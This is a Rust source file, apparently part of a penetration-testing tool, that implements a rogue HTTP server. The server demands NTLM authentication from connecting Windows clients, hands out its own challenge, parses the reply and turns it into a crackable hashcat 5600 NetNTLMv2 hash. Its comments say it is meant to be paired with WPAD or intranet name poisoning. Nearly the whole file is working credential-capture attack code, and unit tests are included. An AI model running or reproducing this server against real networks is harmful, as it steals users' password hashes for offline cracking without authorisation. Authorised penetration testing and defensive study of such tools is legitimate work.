// rogue_http — minimal http server that demands NTLM auth and captures the
// AUTHENTICATE blob into a hashcat 5600 hash.
//
// flow per tcp connection:
//   req 1 (no auth)            → 401 + WWW-Authenticate: NTLM (no blob)
//   req 2 (Auth: NTLM <type1>) → 401 + WWW-Authenticate: NTLM <type2 challenge>
//   req 3 (Auth: NTLM <type3>) → 200 + emit Credential
//
// when combined with name-poisoning (wpad, intranet, etc.), windows clients
// hit us thinking we're an internal http resource and leak hashes.

use anyhow::Result;
use std::io::{Read, Write};
use std::net::{Ipv4Addr, SocketAddr, SocketAddrV4, TcpListener, TcpStream};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{mpsc, Arc};
use std::time::Duration;

use crate::attacks::ntlmssp;
use crate::events::{EventKind, PentestEvent};

pub const ROGUE_HTTP_PORT: u16 = 80;

// bind, accept, spawn a short-lived thread per connection.
pub fn run_rogue_http(
    bind_ip: Ipv4Addr,
    port: u16,
    event_tx: mpsc::Sender<PentestEvent>,
    stop: Arc<AtomicBool>,
) -> Result<()> {
    let addr = SocketAddr::V4(SocketAddrV4::new(bind_ip, port));
    let listener = TcpListener::bind(addr)?;
    listener.set_nonblocking(true)?;

    while !stop.load(Ordering::Relaxed) {
        match listener.accept() {
            Ok((stream, peer)) => {
                let tx = event_tx.clone();
                std::thread::spawn(move || handle_connection(stream, peer, tx));
            }
            Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                std::thread::sleep(Duration::from_millis(100));
            }
            Err(e) => {
                log::debug!("rogue http accept err: {}", e);
            }
        }
    }
    Ok(())
}

fn handle_connection(mut stream: TcpStream, peer: SocketAddr, event_tx: mpsc::Sender<PentestEvent>) {
    let _ = stream.set_read_timeout(Some(Duration::from_secs(10)));
    let _ = stream.set_write_timeout(Some(Duration::from_secs(5)));

    let src_ip = match peer {
        SocketAddr::V4(a) => *a.ip(),
        SocketAddr::V6(_) => return,
    };

    // per-connection state: the challenge we handed out (if any).
    let mut issued_challenge: Option<[u8; 8]> = None;

    // at most 3 requests per connection — we're not a real webserver
    for _ in 0..3 {
        let req = match read_http_request(&mut stream) {
            Some(r) => r,
            None => return,
        };

        let auth = find_auth_ntlm_header(&req);
        match auth {
            None => {
                // no auth yet — send 401 demanding NTLM (no blob)
                let _ = stream.write_all(http_401_no_blob().as_bytes());
            }
            Some(blob_b64) => {
                let blob = match ntlmssp::base64_decode(blob_b64) {
                    Some(b) => b,
                    None => {
                        let _ = stream.write_all(http_400().as_bytes());
                        return;
                    }
                };
                let (off, msg_type) = match ntlmssp::find_message(&blob) {
                    Some(m) => m,
                    None => {
                        let _ = stream.write_all(http_400().as_bytes());
                        return;
                    }
                };
                let msg = &blob[off..];

                match msg_type {
                    ntlmssp::NtlmMessageType::Negotiate => {
                        // issue a challenge back
                        let challenge = new_challenge();
                        issued_challenge = Some(challenge);
                        let type2 = build_ntlm_type2_challenge(challenge);
                        let b64 = ntlmssp::base64_encode(&type2);
                        let _ = stream.write_all(http_401_with_blob(&b64).as_bytes());
                    }
                    ntlmssp::NtlmMessageType::Authenticate => {
                        let challenge = match issued_challenge {
                            Some(c) => c,
                            None => {
                                // client skipped the negotiate step — use a fresh
                                // challenge (invalid for cracking but we still
                                // see the attempt). emit an info event.
                                let _ = event_tx.send(PentestEvent::info(format!(
                                    "rogue-http: orphan AUTHENTICATE from {} (no prior CHALLENGE)",
                                    src_ip
                                )));
                                let _ = stream.write_all(http_200().as_bytes());
                                return;
                            }
                        };
                        let auth = match ntlmssp::parse_authenticate(msg) {
                            Some(a) => a,
                            None => {
                                let _ = stream.write_all(http_400().as_bytes());
                                return;
                            }
                        };
                        if let Some(line) = ntlmssp::format_hashcat_5600(
                            &auth.username,
                            &auth.domain,
                            &challenge,
                            &auth.nt_response,
                        ) {
                            let _ = event_tx.send(PentestEvent::new(EventKind::Credential {
                                kind: crate::events::CredentialKind::NetNtlmV2,
                                proto: "ntlm-v2-http".into(),
                                detail: line,
                                src: Some(src_ip),
                                dst: None,
                            }));
                        }
                        let _ = stream.write_all(http_200().as_bytes());
                        return;
                    }
                    ntlmssp::NtlmMessageType::Challenge => {
                        // client shouldn't be sending us a challenge; close
                        let _ = stream.write_all(http_400().as_bytes());
                        return;
                    }
                }
            }
        }
    }
}

// read until "\r\n\r\n" or eof / 64k cap, whichever comes first. crude.
fn read_http_request(stream: &mut TcpStream) -> Option<String> {
    let mut buf = Vec::with_capacity(4096);
    let mut chunk = [0u8; 1024];
    loop {
        match stream.read(&mut chunk) {
            Ok(0) => return None,
            Ok(n) => {
                buf.extend_from_slice(&chunk[..n]);
                if buf.windows(4).any(|w| w == b"\r\n\r\n") {
                    break;
                }
                if buf.len() > 64 * 1024 {
                    return None;
                }
            }
            Err(_) => return None,
        }
    }
    Some(String::from_utf8_lossy(&buf).into_owned())
}

fn find_auth_ntlm_header(req: &str) -> Option<&str> {
    const PREFIX: &str = "Authorization: NTLM ";
    for line in req.lines() {
        if let Some(head) = line.get(..PREFIX.len()) {
            if head.eq_ignore_ascii_case(PREFIX) {
                return Some(line[PREFIX.len()..].trim());
            }
        }
    }
    None
}

// time-based per-connection challenge. not cryptographic, just unique-ish
// so captured hashes don't collide.
fn new_challenge() -> [u8; 8] {
    let n = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos() as u64)
        .unwrap_or(0x1122_3344_5566_7788);
    n.to_be_bytes()
}

// minimal type-2 CHALLENGE message (48 bytes): signature + msg_type +
// empty targetname/targetinfo + negotiate_flags + our 8-byte challenge.
fn build_ntlm_type2_challenge(challenge: [u8; 8]) -> Vec<u8> {
    let mut m = vec![0u8; 48];
    m[0..8].copy_from_slice(b"NTLMSSP\0");
    m[8..12].copy_from_slice(&2u32.to_le_bytes());
    // TargetNameFields (len=0, maxlen=0, offset=48)
    m[12..14].copy_from_slice(&0u16.to_le_bytes());
    m[14..16].copy_from_slice(&0u16.to_le_bytes());
    m[16..20].copy_from_slice(&48u32.to_le_bytes());
    // NegotiateFlags — a set that windows clients reliably accept
    // (unicode + ntlm + target-type-server + always-sign + target-info + version)
    m[20..24].copy_from_slice(&0xa2898215u32.to_le_bytes());
    // ServerChallenge
    m[24..32].copy_from_slice(&challenge);
    // Reserved @32..40 already zero
    // TargetInfoFields (len=0, maxlen=0, offset=48)
    m[40..42].copy_from_slice(&0u16.to_le_bytes());
    m[42..44].copy_from_slice(&0u16.to_le_bytes());
    m[44..48].copy_from_slice(&48u32.to_le_bytes());
    m
}

fn http_401_no_blob() -> String {
    "HTTP/1.1 401 Unauthorized\r\n\
     WWW-Authenticate: NTLM\r\n\
     Content-Length: 0\r\n\
     Connection: keep-alive\r\n\
     \r\n"
        .into()
}

fn http_401_with_blob(b64: &str) -> String {
    format!(
        "HTTP/1.1 401 Unauthorized\r\n\
         WWW-Authenticate: NTLM {}\r\n\
         Content-Length: 0\r\n\
         Connection: keep-alive\r\n\
         \r\n",
        b64
    )
}

fn http_200() -> String {
    "HTTP/1.1 200 OK\r\n\
     Content-Length: 0\r\n\
     Connection: close\r\n\
     \r\n"
        .into()
}

fn http_400() -> String {
    "HTTP/1.1 400 Bad Request\r\n\
     Content-Length: 0\r\n\
     Connection: close\r\n\
     \r\n"
        .into()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_find_auth_header_case_insensitive() {
        let req = "GET / HTTP/1.1\r\nHost: x\r\nauthorization: ntlm Zm9v\r\n\r\n";
        assert_eq!(find_auth_ntlm_header(req), Some("Zm9v"));
    }

    #[test]
    fn test_find_auth_header_missing() {
        let req = "GET / HTTP/1.1\r\nHost: x\r\n\r\n";
        assert_eq!(find_auth_ntlm_header(req), None);
    }

    #[test]
    fn test_build_ntlm_type2_challenge_parses_back() {
        let c = [0xaa, 0xbb, 0xcc, 0xdd, 0x11, 0x22, 0x33, 0x44];
        let msg = build_ntlm_type2_challenge(c);
        let extracted = ntlmssp::parse_challenge(&msg).expect("parseable");
        assert_eq!(extracted, c);
    }

    #[test]
    fn test_http_responses_are_well_formed() {
        assert!(http_401_no_blob().starts_with("HTTP/1.1 401"));
        assert!(http_401_with_blob("abc").contains("NTLM abc"));
        assert!(http_200().starts_with("HTTP/1.1 200"));
        assert!(http_400().starts_with("HTTP/1.1 400"));
    }

    #[test]
    fn test_new_challenge_is_8_bytes() {
        let c = new_challenge();
        assert_eq!(c.len(), 8);
    }
}
